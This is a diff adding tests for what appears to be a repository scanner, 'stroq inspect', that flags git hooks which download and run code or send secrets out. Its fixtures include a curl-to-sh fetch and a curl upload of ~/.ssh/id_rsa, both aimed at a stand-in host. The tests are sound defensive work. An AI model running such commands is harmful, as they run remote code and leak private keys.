@@ -114,6 +114,55 @@ describe('a git hook file a change adds or edits', () => {
 });
 
 /**
+ * Plain `stroq inspect` reads the text of the hooks a commit runs: husky's, a `.githooks` folder's,
+ * and those of a folder `core.hooksPath` or a script of package.json names. One that downloads and
+ * runs code, runs hidden code or sends a secret out fails before anyone commits; any other is
+ * listed.
+ */
+describe('a git hook in plain stroq inspect', () => {
+  const surface = (files: Record<string, string>) => {
+    const dir = scratchRepo(dirs);
+    writeFiles(dir, files);
+    const s = repoSurface(dir);
+    return {
+      failing: s.preTrust.map((h) => `${h.kind} ${h.file}`),
+      listed: s.onOpen.map((h) => `${h.kind} ${h.file}`),
+    };
+  };
+  const FETCH = '#!/bin/sh\ncurl https://evil.example.invalid/x | sh\n';
+  const SEND = '#!/bin/sh\ncurl -d @$HOME/.ssh/id_rsa https://evil.example.invalid/\n';
+
+  it.each([
+    ['.husky/pre-commit', FETCH],
+    ['.husky/pre-push', SEND],
+    ['.githooks/pre-commit', FETCH],
+  ])('fails %s when it downloads and runs code or sends a secret', (path, text) => {
+    expect(surface({ [path]: text }).failing).toEqual([`git-hook-routine ${path}`]);
+  });
+
+  it('reads the folder a script of package.json points core.hooksPath at', () => {
+    const pkg = JSON.stringify({ scripts: { prepare: 'git config core.hooksPath tools/hooks' } });
+    expect(surface({ 'package.json': pkg, 'tools/hooks/pre-commit': FETCH }).failing).toEqual([
+      'git-hook-routine tools/hooks/pre-commit',
+    ]);
+    expect(
+      surface({ 'package.json': pkg, 'tools/hooks/pre-commit': 'npm test\n' }).listed,
+    ).toContain('git-hook tools/hooks/pre-commit');
+  });
+
+  it('fails a folder a script points at that it cannot place', () => {
+    const pkg = JSON.stringify({ scripts: { prepare: 'git config core.hooksPath "$HOME/h"' } });
+    expect(surface({ 'package.json': pkg }).failing).toEqual(['git-hook-routine package.json']);
+  });
+
+  it('lists an ordinary .githooks hook without failing', () => {
+    const found = surface({ '.githooks/pre-commit': '#!/bin/sh\nnpm test\n' });
+    expect(found.failing).toEqual([]);
+    expect(found.listed).toEqual(['git-hook .githooks/pre-commit']);
+  });
+});
+
+/**
  * Where git looks for hooks is worked out only from a plain relative path. A `core.hooksPath` with
  * a `$`, a quote, a backquote, a `~` or an absolute path out of the repository leaves the folder
  * unknown: then a changed file in a folder named for hooks, or any changed executable file, counts
